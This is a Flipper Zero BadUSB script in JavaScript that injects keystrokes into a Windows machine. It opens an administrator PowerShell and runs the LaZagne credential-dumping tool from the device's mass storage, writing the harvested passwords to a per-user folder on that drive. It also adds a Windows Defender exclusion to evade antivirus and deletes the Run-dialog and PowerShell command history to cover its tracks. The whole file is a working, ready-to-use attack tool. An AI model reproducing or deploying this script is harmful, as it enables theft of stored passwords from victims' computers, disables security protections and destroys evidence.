// Rename Example.exe to the correct binary name you stored on the Flipper's mass storage
let binary = "lazagne.exe";
// Can pass arguments to the binary here, if none exist just leave this as is, you do NOT need to comment it out
let binary_args = "all | tee -FilePath lazagnelogs.txt";
// Create a Mass Storage Image called Lazagne on the Flipper before use
let image = "/ext/apps_data/mass_storage/Lazagne.img";
// Required
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
// Checks for the Powershell.img on the Flipper
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Please create the Lazagne.img and place the " + binary + " in that storage...");
    exit;
}
// HID as VID/PID and keep connected
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}
// Start of the program
badusb.press("GUI", "r"); //Open Run Dialog
delay(300);
badusb.println('powershell -Command "Start-Process powershell -Verb RunAs"');
delay(400);
badusb.press("ENTER"); // Runs Powershell as Admin
delay(2000);
badusb.press("ALT", "y");
delay(2000);
print("Running payload"); // Detect the Flipper, set the DriveLetter, set the Flipper's drive as an excluded drive from Windows Defender to bypass AV, Run the given Binary, clean up after and remove command history
badusb.println("Start-Sleep 2;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;New-Item -ItemType Directory -Path $directoryPath;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd $directoryPath;. $Bin_Path " + binary_args + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
badusb.press("ENTER");
badusb.quit();
delay(2000);
print("Please wait until PowerShell window closes...");
// Open Mass Storage 
usbdisk.start(image); //Open MassStorage Folder that has the binary
// Check for eject
while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");
